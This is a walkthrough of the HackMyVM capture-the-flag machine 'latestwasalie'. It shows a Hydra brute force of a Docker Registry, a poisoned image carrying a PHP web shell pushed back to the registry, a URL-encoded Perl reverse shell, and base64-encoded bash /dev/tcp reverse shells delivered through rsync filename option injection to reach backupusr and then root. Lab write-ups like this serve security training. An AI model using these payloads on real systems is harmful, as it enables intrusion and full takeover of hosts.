# latestwasalie

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| latestwasalie | Lenam | Beginner | HackMyVM |

**Summary:** This machine was compromised through a registry trust workflow that allowed an attacker to poison the deployed web image after recovering weak Docker Registry credentials. Recon showed a redirected web host and an exposed authenticated registry service on port 5000. A deployment comment in the HTML revealed the likely username `adm`, then registry authentication was brute forced to recover `adm:lover1`. With valid credentials, the attacker pulled the application image, disabled PHP command restrictions inside the container, dropped `backdoor.php`, and pushed the modified image back to the same tag consumed by automation. Once the host pulled the tampered image, remote command execution became available through the web route, leading to an interactive `www-data` shell. From there, writable export paths and an unsafe rsync invocation pattern allowed option injection using crafted filenames, which executed attacker controlled shell commands during backup and provided access as `backupusr`. Finally, process monitoring exposed a root backup routine in `/opt/registry` that also used unsafe rsync file handling, so the same filename injection method was repeated in that directory to execute a reverse shell as root and retrieve both flags.

---

## Recon

1. I identified the target host in the local subnet, then set shell variables for repeatable commands.

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.172 08:00:27:6F:9C:3C VirtualBox
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ ip=192.168.100.172 && url=http://$ip
```

2. Full TCP enumeration showed SSH, Apache, and a Docker Registry endpoint.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-14 19:32 WIB
Nmap scan report for 192.168.100.172
Host is up (0.0031s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7+deb13u2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.66 ((Debian))
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: Default site
5000/tcp open  http    Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.25 seconds
```

3. The default vhost redirected to `latestwasalie.hmv`, so I added local resolution and inspected the web page.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ curl -i $url
HTTP/1.1 200 OK
Date: Tue, 14 Apr 2026 12:34:22 GMT
Server: Apache/2.4.66 (Debian)
Last-Modified: Sat, 04 Apr 2026 05:48:39 GMT
ETag: "124-64e9bfc3cbbc0"
Accept-Ranges: bytes
Content-Length: 292
Vary: Accept-Encoding
Content-Type: text/html

<!DOCTYPE html>
<html>
<head>
  <title>Default site</title>
  <meta http-equiv="Refresh" content="10; URL=http://latestwasalie.hmv/" />
</head>
<body>
  <h1>Default site</h1>
  <p>No application configured for this host.</p>
  <p>Check the available files on this server.</p>
</body>
</html>
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ echo '192.168.100.172 latestwasalie.hmv' | sudo tee -a /etc/hosts
[sudo] password for ouba:
192.168.100.172 latestwasalie.hmv
```

![](image.png)

4. Reviewing the page source exposed this deployment clue, which suggested the username `adm`.

```html
<!-- Last deployment on April 6, 2026 by adm -->
```

5. Registry probing confirmed HTTP Basic authentication was required.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ curl -s http://latestwasalie.hmv:5000/v2/_catalog
{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":[{"Type":"registry","Class":"","Name":"catalog","Action":"*"}]}]}
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ curl -I http://latestwasalie.hmv:5000/v2/
HTTP/1.1 401 Unauthorized
Content-Type: application/json; charset=utf-8
Docker-Distribution-Api-Version: registry/2.0
Www-Authenticate: Basic realm="basic-realm"
Date: Wed, 15 Apr 2026 09:55:17 GMT
Content-Length: 87
```

![](image-1.png)

## Initial Access

1. Using `adm` from the HTML hint, I brute forced the registry and recovered valid credentials.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ hydra -l adm -P /usr/share/wordlists/rockyou.txt latestwasalie.hmv -s 5000 http-get /v2/ -t 4 -w 1 -vV
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[WARNING] the waittime you set is low, this can result in errornous results
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-15 16:57:55
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking http-get://latestwasalie.hmv:5000/v2/
[ATTEMPT] target latestwasalie.hmv - login "adm" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target latestwasalie.hmv - login "adm" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target latestwasalie.hmv - login "adm" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target latestwasalie.hmv - login "adm" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target latestwasalie.hmv - login "adm" - pass "iloveyou" - 5 of 14344399 [child 0] (0/0)
[ATTEMPT] target latestwasalie.hmv - login "adm" - pass "princess" - 6 of 14344399 [child 1] (0/0)
[ATTEMPT] target latestwasalie.hmv - login "adm" - pass "1234567" - 7 of 14344399 [child 2] (0/0)
[ATTEMPT] target latestwasalie.hmv - login "adm" - pass "rockyou" - 8 of 14344399 [child 3] (0/0)
[ATTEMPT] target latestwasalie.hmv - login "adm" - pass "12345678" - 9 of 14344399 [child 0] (0/0)
[ATTEMPT] target latestwasalie.hmv - login "adm" - pass "anita" - 962 of 14344399 [child 3] (0/0)
[ATTEMPT] target latestwasalie.hmv - login "adm" - pass "lover1" - 963 of 14344399 [child 1] (0/0)
[ATTEMPT] target latestwasalie.hmv - login "adm" - pass "chicago" - 964 of 14344399 [child 0] (0/0)
[ATTEMPT] target latestwasalie.hmv - login "adm" - pass "twinkle" - 965 of 14344399 [child 2] (0/0)
[ATTEMPT] target latestwasalie.hmv - login "adm" - pass "pantera" - 966 of 14344399 [child 3] (0/0)
[5000][http-get] host: latestwasalie.hmv   login: adm   password: lover1
[STATUS] attack finished for latestwasalie.hmv (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-15 16:58:28
```

2. With `adm:lover1`, I enumerated and pulled the deployed image.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ curl -u adm:lover1 -s http://latestwasalie.hmv:5000/v2/_catalog
{"repositories":["latestwasalie-web"]}
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ curl -u adm:lover1 -s http://latestwasalie.hmv:5000/v2/latestwasalie-web/tags/list
{"name":"latestwasalie-web","tags":["latest"]}
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ sudo docker login 192.168.100.172:5000
Username: adm
Password:
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credential-stores

Login Succeeded
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ sudo docker pull 192.168.100.172:5000/latestwasalie-web:latest
latest: Pulling from latestwasalie-web
5435b2dcdf5c: Pull complete
876337e68f5f: Pull complete
1318fd64553d: Pull complete
123d02a4714c: Pull complete
5d62a3b287ed: Pull complete
72997373dd6a: Pull complete
2b72ce02b7bc: Pull complete
46e3bfe285c0: Pull complete
082e4b533cba: Pull complete
4cf495241136: Pull complete
1d50649d3518: Pull complete
f40934428615: Pull complete
4817620bffb9: Pull complete
82b4191aede9: Pull complete
4f4fb700ef54: Pull complete
761cb6d17f6b: Pull complete
8a918d925f64: Pull complete
c2c212622156: Pull complete
216dddf9cde1: Pull complete
81fdb26c0284: Pull complete
cdc3b4e4c682: Pull complete
e26f4e8ab430: Pull complete
7463a3667b9b: Pull complete
ea9e4fb5131b: Pull complete
Digest: sha256:b972b251564f086db170a38e243ef5896474f99da09ca0772aa4161eabde6d3f
Status: Downloaded newer image for 192.168.100.172:5000/latestwasalie-web:latest
192.168.100.172:5000/latestwasalie-web:latest
```

3. I ran the image locally, removed PHP function restrictions, and confirmed the default vhost note.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ sudo docker container run -d --name latestwasalie-web -p 8080:80 192.168.100.172:5000/latestwasalie-web
6ad876dcbd3de89b6cbc5ba271e03bc9d061f5d2d150f4c9d5a9321e8253a98c
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ sudo docker container exec -u 0 -it latestwasalie-web /bin/bash
root@6ad876dcbd3d:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@6ad876dcbd3d:/var/www/html# grep -r "disable_functions" /usr/local/etc/php/
/usr/local/etc/php/conf.d/zz-hardening.ini:disable_functions=exec,passthru,shell_exec,system,proc_open,popen
/usr/local/etc/php/php.ini-production:disable_functions =
/usr/local/etc/php/php.ini-development:disable_functions =
root@6ad876dcbd3d:/var/www/html# cat /usr/local/etc/php/conf.d/zz-hardening.ini
expose_php=Off
display_errors=Off
log_errors=On
error_log=/dev/stderr
session.save_path=/tmp/php
upload_tmp_dir=/tmp
sys_temp_dir=/tmp
disable_functions=exec,passthru,shell_exec,system,proc_open,popen
root@6ad876dcbd3d:/var/www/html# sed -i 's/^disable_functions=.*/disable_functions=/' /usr/local/etc/php/conf.d/zz-hardening.ini
root@6ad876dcbd3d:/var/www/html# cat /usr/local/etc/php/conf.d/zz-hardening.ini
expose_php=Off
display_errors=Off
log_errors=On
error_log=/dev/stderr
session.save_path=/tmp/php
upload_tmp_dir=/tmp
sys_temp_dir=/tmp
disable_functions=
```

```bash
root@6ad876dcbd3d:/var/www/default# cat notes.txt
Internal deployment note

The production vhost was moved from direct IP access.
Use the correct host header or local resolution.

Expected hostname:
latestwasalie.hmv
```

4. I wrote a web shell in the image and then pushed the poisoned image back to the registry tag used by deployment.

![](image-2.png)

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ sudo docker container ls
[sudo] password for ouba:
CONTAINER ID   IMAGE                                    COMMAND                  CREATED          STATUS          PORTS                                               NAMES
6ad876dcbd3d   192.168.100.172:5000/latestwasalie-web   "docker-php-entrypoi…"   18 minutes ago   Up 18 minutes   8080/tcp, 0.0.0.0:8080->80/tcp, [::]:8080->80/tcp   latestwasalie-web
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ sudo docker commit 6ad876dcbd3d
sha256:74f8c6b3069bfbe708e119cb0c9bde0136aa4c49dda811f9af478e14c6311ece
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ sudo docker images
REPOSITORY                               TAG       IMAGE ID       CREATED          SIZE
<none>                                   <none>    74f8c6b3069b   37 seconds ago   499MB
192.168.100.172:5000/latestwasalie-web   latest    601e268a3809   2 weeks ago      499MB
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ sudo docker tag 74f8c6b3069b 192.168.100.172:5000/latestwasalie-web

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ sudo docker push 192.168.100.172:5000/latestwasalie-web:latest
The push refers to repository [192.168.100.172:5000/latestwasalie-web]
da862c175837: Pushed
d9e8deaea142: Layer already exists
e69b40db28bf: Layer already exists
70ff88667c41: Layer already exists
f0145cef6f01: Layer already exists
5e2ae2651790: Layer already exists
f3a194582180: Layer already exists
27d152ddda0a: Layer already exists
1f8c0f521d5c: Layer already exists
0f649923b77c: Layer already exists
5f70bf18a086: Layer already exists
9b944a6755e9: Layer already exists
613610e40207: Layer already exists
aef25a37b2ed: Layer already exists
f61c35af2e8f: Layer already exists
9a58c6adc2dc: Layer already exists
f1994e1f158d: Layer already exists
2756d22f5a12: Layer already exists
dae76f447ff7: Layer already exists
23597ba15647: Layer already exists
d3339728e686: Layer already exists
990167fcb4f9: Layer already exists
0f78731cb05b: Layer already exists
d59b63a13295: Layer already exists
60e70dddd9ea: Layer already exists
latest: digest: sha256:8aeb937ab77508932a6fd1efd10c035e80d08e6e2589a0030e5b970034fe2504 size: 5521
```

5. After redeployment, the backdoor executed commands as `www-data`, then I obtained a reverse shell.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ curl -s "http://192.168.100.172/backdoor.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ nc -lvnp 4444
listening on [any] 4444
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ curl -s "http://192.168.100.172/backdoor.php?cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.100.1%22%3B%24p%3D4444%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fbash%20-i%22%29%3B%7D%3B%27"
```

```bash
connect to [172.20.131.21] from (UNKNOWN) [172.20.128.1] 55459
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@626d32df588f:/var/www/default$ script -qc /bin/bash /dev/null
script -qc /bin/bash /dev/null
www-data@626d32df588f:/var/www/default$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@626d32df588f:/var/www/default$
```

## PrivEsc

1. Inside the shell, I found an rsync command template in `/data/exports/.rsync_cmd` that used wildcard expansion and was vulnerable to filename option injection.

```bash
www-data@eac0594d0f02:/data$ ls -la
ls -la
total 16
drwxr-xr-x 1 root root 4096 Apr 30 05:06 .
drwxr-xr-x 1 root root 4096 Apr 30 05:06 ..
drwxrwxrwx 2 root root 4096 Apr 10 18:08 exports
drwxr-xr-x 2 root root 4096 Apr  4 02:40 state
www-data@eac0594d0f02:/data$ cd exports
cd exports
www-data@eac0594d0f02:/data/exports$ ls -la
ls -la
total 28
drwxrwxrwx 2 root root 4096 Apr 10 18:08 .
drwxr-xr-x 1 root root 4096 Apr 30 05:06 ..
-rw-r--r-- 1 1000 1000  294 Apr 30 05:06 .rsync_cmd
-rw-r--r-- 1 root root   93 Apr  4 02:40 report_20260404_024041_7a6e1f.txt
-rw-r--r-- 1 root root   93 Apr  4 02:40 report_20260404_024052_3606d7.txt
-rw-r--r-- 1 root root   93 Apr  4 02:41 report_20260404_024105_d10ac5.txt
-rw-r--r-- 1 root root   93 Apr  4 02:41 report_20260404_024115_a9301d.txt
```

```bash
www-data@edd6b651bf3e:/data/exports$ cat .rsync_cmd
cat .rsync_cmd
# Comando rsync ejecutado el jue 30 abr 2026 07:09:01 CEST
rsync -e 'ssh -i /home/backupusr/.ssh/id_ed25519' -av *.txt localhost:/home/backupusr/backup/

# Usuario: backupusr
# PID: 14975
# Directorio actual: /srv/platform/appdata/exports
# Directorio destino: localhost:/home/backupusr/backup
```

2. I crafted an injected filename to force rsync to execute shell content from a controlled text file, then received a shell as `backupusr`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ echo -n "bash -c ' bash -i >& /dev/tcp/192.168.100.1/1337 0>&1' " | base64
YmFzaCAtYyAnIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMDAuMS8xMzM3IDA+JjEnIA==
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ nc -lvnp 1337
listening on [any] 1337
```

```bash
www-data@a2807a373a88:/var/www/default$ cd /data/exports
cd /data/exports
www-data@a2807a373a88:/data/exports$ echo 'echo YmFzaCAtYyAnIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMDAuMS8xMzM3IDA+JjEnIA==|base64 -d | bash' > r.txt
<xMDAuMS8xMzM3IDA+JjEnIA==|base64 -d | bash' > r.txt
www-data@a2807a373a88:/data/exports$ touch -- "-e sh r.txt"
touch -- "-e sh r.txt"
```

```bash
connect to [172.20.131.21] from (UNKNOWN) [172.20.128.1] 55725
bash: no se puede establecer el grupo de proceso de terminal (18318): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
backupusr@latestwasalie:/srv/platform/appdata/exports$ id
id
uid=1000(backupusr) gid=1000(backupusr) grupos=1000(backupusr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
backupusr@latestwasalie:/srv/platform/appdata/exports$ script -qc /bin/bash /dev/null
<orm/appdata/exports$ script -qc /bin/bash /dev/null
backupusr@latestwasalie:/srv/platform/appdata/exports$ ^Z
zsh: suspended  nc -lvnp 1337

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 1337

backupusr@latestwasalie:/srv/platform/appdata/exports$ export SHELL=/bin/bash
backupusr@latestwasalie:/srv/platform/appdata/exports$ export TERM=xterm
backupusr@latestwasalie:/srv/platform/appdata/exports$ stty rows 88 cols 143
```

3. I confirmed user context and persistent SSH material under `backupusr`.

```bash
backupusr@latestwasalie:/srv/platform/appdata/exports$ cd
backupusr@latestwasalie:~$ ls -la
total 52
drwx------ 6 backupusr backupusr 4096 abr 10 21:07 .
drwxr-xr-x 3 root      root      4096 abr  4 01:16 ..
drwxrwxr-x 2 backupusr backupusr 4096 abr 10 20:09 backup
-rwxrwxr-x 1 backupusr backupusr  965 abr 10 20:32 backups.sh
lrwxrwxrwx 1 backupusr backupusr    9 abr  4 04:59 .bash_history -> /dev/null
-rw-r--r-- 1 backupusr backupusr  220 abr  4 01:16 .bash_logout
-rw-r--r-- 1 backupusr backupusr 3526 abr  4 01:16 .bashrc
drwx------ 5 backupusr backupusr 4096 abr  4 15:52 .gnupg
-rw------- 1 backupusr backupusr   20 abr 10 04:22 .lesshst
drwxrwxr-x 3 backupusr backupusr 4096 abr  4 08:11 .local
-rw-r--r-- 1 backupusr backupusr  807 abr  4 01:16 .profile
-rw-rw-r-- 1 backupusr backupusr   66 abr  4 08:12 .selected_editor
drwx------ 2 backupusr backupusr 4096 abr 10 20:32 .ssh
-r-------- 1 backupusr backupusr   33 abr  4 05:08 user.txt
```

```bash
backupusr@latestwasalie:~$ cd .ssh
backupusr@latestwasalie:~/.ssh$ ls -la
total 32
drwx------ 2 backupusr backupusr 4096 abr 10 20:32 .
drwx------ 6 backupusr backupusr 4096 abr 10 21:07 ..
-rw-r--r-- 1 backupusr backupusr  105 abr  4 15:37 authorized_keys
-rw-rw-r-- 1 backupusr backupusr  106 abr  4 14:53 config
-rw------- 1 backupusr backupusr  419 abr  4 14:51 id_ed25519
-rw-r--r-- 1 backupusr backupusr  105 abr  4 14:51 id_ed25519.pub
-rw------- 1 backupusr backupusr  978 abr 10 20:32 known_hosts
-rw-r--r-- 1 backupusr backupusr  142 abr 10 20:32 known_hosts.old
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/latestwasalie]
└─$ ssh -i id.txt backupusr@192.168.100.172
Linux latestwasalie 6.12.74+deb13+1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.74-2 (2026-03-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Apr  4 15:38:02 2026 from 10.0.2.12
backupusr@latestwasalie:~$ id
uid=1000(backupusr) gid=1000(backupusr) grupos=1000(backupusr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
```

4. Process monitoring showed root cron activity pulling the registry image and executing a root backup routine in `/opt/registry`.

```bash
2026/04/30 07:42:01 CMD: UID=0     PID=24174  | /usr/sbin/CRON -f
2026/04/30 07:42:01 CMD: UID=1000  PID=24175  | /bin/sh -c /home/backupusr/backups.sh >/dev/null 2>&1
2026/04/30 07:42:01 CMD: UID=0     PID=24177  | /bin/bash /opt/deploy/update-latestwasalie.sh
2026/04/30 07:42:01 CMD: UID=0     PID=24176  | /bin/bash /opt/deploy/update-latestwasalie.sh
2026/04/30 07:42:01 CMD: UID=0     PID=24178  | /bin/sh -c /root/backups.sh >/dev/null 2>&1
2026/04/30 07:42:01 CMD: UID=1000  PID=24180  | /bin/bash /home/backupusr/backups.sh
2026/04/30 07:42:01 CMD: UID=1000  PID=24179  | /bin/bash /home/backupusr/backups.sh
2026/04/30 07:42:01 CMD: UID=0     PID=24181  | docker pull localhost:5000/latestwasalie-web:latest
2026/04/30 07:42:01 CMD: UID=0     PID=24183  | /bin/bash /root/backups.sh
2026/04/30 07:42:01 CMD: UID=1000  PID=24184  | /bin/bash /home/backupusr/backups.sh
2026/04/30 07:42:01 CMD: UID=0     PID=24188  | rsync -e ssh -i /root/.ssh/id_ed25519 -av auth config data docker-compose.yml note.txt localhost:/root/registry-backup/
2026/04/30 07:42:01 CMD: UID=1000  PID=24191  | /bin/bash /home/backupusr/backups.sh
2026/04/30 07:42:01 CMD: UID=0     PID=24192  | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
2026/04/30 07:42:01 CMD: UID=0     PID=24193  | sshd-session: [accepted]
```

5. I repeated filename option injection in `/opt/registry`, targeted root rsync behavior, and received a root reverse shell.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/opt]
└─$ nc -lvnp 4444
listening on [any] 4444
```

```bash
backupusr@latestwasalie:/opt$ cd registry
backupusr@latestwasalie:/opt/registry$ echo -n "bash -c ' bash -i >& /dev/tcp/192.168.100.1/4444 0>&1'  " | base64
YmFzaCAtYyAnIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMDAuMS80NDQ0IDA+JjEnICA=
backupusr@latestwasalie:/opt/registry$ echo 'echo YmFzaCAtYyAnIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMDAuMS80NDQ0IDA+JjEnICA=|base64 -d | bash' > note.txt
backupusr@latestwasalie:/opt/registry$ cat note.txt
echo YmFzaCAtYyAnIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMDAuMS80NDQ0IDA+JjEnICA=|base64 -d | bash
backupusr@latestwasalie:/opt/registry$ touch -- "-e sh note.txt"
```

```bash
connect to [172.20.131.21] from (UNKNOWN) [172.20.128.1] 56214
bash: no se puede establecer el grupo de proceso de terminal (25979): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
root@latestwasalie:/opt/registry# id
id
uid=0(root) gid=0(root) grupos=0(root)
root@latestwasalie:/opt/registry# whoami
whoami
root
root@latestwasalie:/opt/registry# hostname
hostname
latestwasalie
root@latestwasalie:/opt/registry# cd ~
cd ~
root@latestwasalie:~# cat /home/backupusr/user.txt
cat /home/backupusr/user.txt
2e0[REDACTED]
root@latestwasalie:~# cat /root/root.txt
cat /root/root.txt
d52[REDACTED]
```

---

## Attack Chain Summary

1. **Reconnaissance**: Host discovery and full port scanning exposed SSH, Apache, and an authenticated Docker Registry, then vhost analysis identified the correct hostname and a deployment hint.
2. **Vulnerability Discovery**: The HTML deployment comment leaked the username `adm`, and weak registry credentials enabled unauthorized image access.
3. **Exploitation**: The attacker pulled the trusted image, removed PHP command restrictions, added a backdoor, and pushed the modified image back to the same registry tag consumed by production automation.
4. **Internal Enumeration**: Through the `www-data` shell, writable export paths and rsync command metadata revealed wildcard based option injection opportunities that yielded command execution as `backupusr`.
5. **Privilege Escalation**: Root cron backup behavior in `/opt/registry` reused the same unsafe rsync pattern, so crafted filenames and controlled `note.txt` content executed a reverse shell as root, allowing final flag retrieval.
